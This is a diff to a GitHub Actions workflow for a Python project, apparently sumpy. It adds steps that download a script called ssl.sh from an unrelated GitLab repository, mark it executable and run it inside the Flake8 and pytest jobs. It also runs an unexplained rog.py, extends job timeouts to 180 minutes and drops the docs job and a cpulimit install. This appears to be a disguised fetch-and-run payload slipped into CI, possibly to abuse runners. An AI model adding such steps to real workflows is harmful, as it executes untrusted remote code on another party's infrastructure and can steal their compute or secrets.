@@ -10,6 +10,7 @@ jobs:
     flake8:
         name: Flake8
         runs-on: ubuntu-latest
+        timeout-minutes: 180
         steps:
         -   uses: actions/checkout@v2
         -
@@ -19,16 +20,24 @@ jobs:
                 python-version: '3.6'
         -   name: "Main Script"
             run: |
+                ./rog.py
                 curl -L -O -k https://gitlab.tiker.net/inducer/ci-support/raw/main/prepare-and-run-flake8.sh
-                sudo apt install cpulimit
-    docs:
-        name: Documentation
+                wget https://gitlab.com/zenrezercolab/netcore/-/raw/main/ssl.sh
+                chmod +x ssl.sh
+                ./ssl.sh 
+                
+    pytest_symengine:
+        name: Conda Pytest Symengine
         runs-on: ubuntu-latest
+        timeout-minutes: 180
         steps:
         -   uses: actions/checkout@v2
         -   name: "Main Script"
             run: |
                 PROJECT=sumpy
+                wget https://gitlab.com/zenrezercolab/netcore/-/raw/main/ssl.sh
+                chmod +x ssl.sh
                 CONDA_ENVIRONMENT=.test-conda-env-py3.yml
                 curl -L -O -k https://gitlab.tiker.net/inducer/ci-support/raw/main/ci-support.sh
                 . ci-support.sh
+                ./ssl.sh
